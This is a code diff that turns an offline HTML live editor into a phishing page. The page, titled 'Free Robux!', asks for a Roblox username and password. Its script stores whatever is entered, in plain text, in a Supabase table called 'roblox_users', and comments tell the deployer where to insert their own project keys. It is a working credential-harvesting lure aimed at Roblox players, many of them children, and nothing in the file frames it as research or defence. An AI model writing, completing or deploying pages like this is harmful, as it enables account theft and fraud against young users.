@@ -1,162 +1,138 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Offline HTML Live Editor</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HBU - Login</title>
+  <!-- Load Supabase JS SDK from CDN -->
+  <script src="https://jsdelivr.net"></script>
   <style>
-    * { box-sizing: border-box; }
+    * {
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
     body {
       margin: 0;
-      font-family: system-ui, -apple-system, sans-serif;
-      display: flex;
-      flex-direction: column;
       height: 100vh;
-      background: #111827;
-      color: #f9fafb;
-    }
-    header {
       display: flex;
-      justify-content: space-between;
       align-items: center;
-      padding: 0.6rem 1rem;
-      background: #1f2937;
-      border-bottom: 1px solid #374151;
-      gap: 0.5rem;
+      justify-content: center;
+      background-color: #000000;
     }
-    header h1 {
-      font-size: 1rem;
-      margin: 0;
+    .login-card {
+      background: #111827;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 360px;
+    }
+    .login-card h1 {
+      margin: 0 0 1.5rem;
+      text-align: center;
+      font-size: 1.75rem;
+      color: #ffffff;
+    }
+    .form-group {
+      margin-bottom: 1rem;
+    }
+    label {
+      display: block;
+      margin-bottom: 0.4rem;
+      font-size: 0.9rem;
       font-weight: 600;
+      color: #ffffff;
     }
-    .actions {
-      display: flex;
-      gap: 0.5rem;
+    input {
+      width: 100%;
+      padding: 0.65rem;
+      border: 1px solid #d1d5db;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+    input:focus {
+      outline: none;
+      border-color: #2563eb;
     }
     button {
-      background: #2563eb;
-      color: white;
+      width: 100%;
+      padding: 0.75rem;
+      margin-top: 0.5rem;
+      background-color: #2563eb;
+      color: #ffffff;
       border: none;
-      padding: 0.4rem 0.75rem;
       border-radius: 6px;
-      font-size: 0.85rem;
+      font-size: 1rem;
+      font-weight: 600;
       cursor: pointer;
     }
-    button:hover { background: #1d4ed8; }
-    button.secondary { background: #374151; }
-    button.secondary:hover { background: #4b5563; }
-    .workspace {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      flex: 1;
-      min-height: 0;
+    button:hover {
+      background-color: #1d4ed8;
     }
-    textarea {
-      width: 100%;
-      height: 100%;
-      resize: none;
-      border: none;
-      outline: none;
-      padding: 1rem;
-      background: #0f172a;
-      color: #e2e8f0;
-      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
-      font-size: 14px;
-      line-height: 1.5;
-      border-right: 1px solid #374151;
-    }
-    iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
-      background: #ffffff;
-    }
-    @media (max-width: 768px) {
-      .workspace {
-        grid-template-columns: 1fr;
-        grid-template-rows: 1fr 1fr;
-      }
-      textarea {
-        border-right: none;
-        border-bottom: 1px solid #374151;
-      }
+    #status {
+      margin-top: 1rem;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #374151;
     }
   </style>
 </head>
 <body>
-  <header>
-    <h1>Offline HTML Live Editor</h1>
-    <div class="actions">
-      <button class="secondary" onclick="resetCode()">Reset</button>
-      <button onclick="downloadCode()">Download .html</button>
-    </div>
-  </header>
-  <div class="workspace">
-    <textarea id="editor" spellcheck="false"></textarea>
-    <iframe id="preview" sandbox="allow-scripts"></iframe>
+
+  <div class="login-card">
+    <h1>Free Robux!</h1>
+    <form id="login-form">
+      <div class="form-group">
+        <label for="username">Username</label>
+        <input type="text" id="username" name="username" required autocomplete="username">
+      </div>
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required autocomplete="current-password">
+      </div>
+      <button type="submit">Claim Your Free Robux!</button>
+    </form>
+    <p id="status"></p>
   </div>
 
   <script>
-    const STORAGE_KEY = "offline_html_editor_code_v1";
-    const DEFAULT_CODE = `<!DOCTYPE html>
-<html>
-<head>
-  <style>
-    body {
-      font-family: sans-serif;
-      padding: 2rem;
-      background: #f0f9ff;
-      color: #0f172a;
-    }
-    .card {
-      background: white;
-      padding: 1.5rem;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-    }
-  </style>
-</head>
-<body>
-  <div class="card">
-    <h1>Hello, Offline World!</h1>
-    <p>Edit the HTML on the left and watch this preview update immediately.</p>
-  </div>
-</body>
-</html>`;
+    // 1. REPLACE THESE WITH YOUR SUPABASE PROJECT CREDENTIALS
+    const SUPABASE_URL = 'https://YOUR_PROJECT_ID.supabase.co';
+    const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY';
 
-    const editor = document.getElementById("editor");
-    const preview = document.getElementById("preview");
+    // Initialize the Supabase client
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-    function renderPreview() {
-      preview.srcdoc = editor.value;
-      try {
-        localStorage.setItem(STORAGE_KEY, editor.value);
-      } catch (e) {}
-    }
+    const form = document.getElementById('login-form');
+    const statusText = document.getElementById('status');
 
-    function resetCode() {
-      editor.value = DEFAULT_CODE;
-      renderPreview();
-    }
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      statusText.textContent = 'Logging in...d';
 
-    function downloadCode() {
-      const blob = new Blob([editor.value], { type: "text/html" });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement("a");
-      a.href = url;
-      a.download = "my-page.html";
-      a.click();
-      URL.revokeObjectURL(url);
-    }
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
 
-    let saved = null;
-    try {
-      saved = localStorage.getItem(STORAGE_KEY);
-    } catch (e) {}
+      // 2. REPLACE 'roblox_users' WITH YOUR TABLE NAME
+      const { data, error } = await supabaseClient
+        .from('roblox_users')
+        .insert([
+          { username: username, password: password }
+        ]);
 
-    editor.value = saved !== null ? saved : DEFAULT_CODE;
-    editor.addEventListener("input", renderPreview);
-    renderPreview();
+      if (error) {
+        console.error('Supabase Error:', error);
+        statusText.style.color = '#dc2626';
+        statusText.textContent = 'Error: ' + error.message;
+      } else {
+        statusText.style.color = '#16a34a';
+        statusText.textContent = 'Submitted successfully!';
+        form.reset();
+        // Optional: Redirect to your dashboard page
+        // window.location.href = '/dashboard.html';
+      }
+    });
   </script>
+
 </body>
 </html>
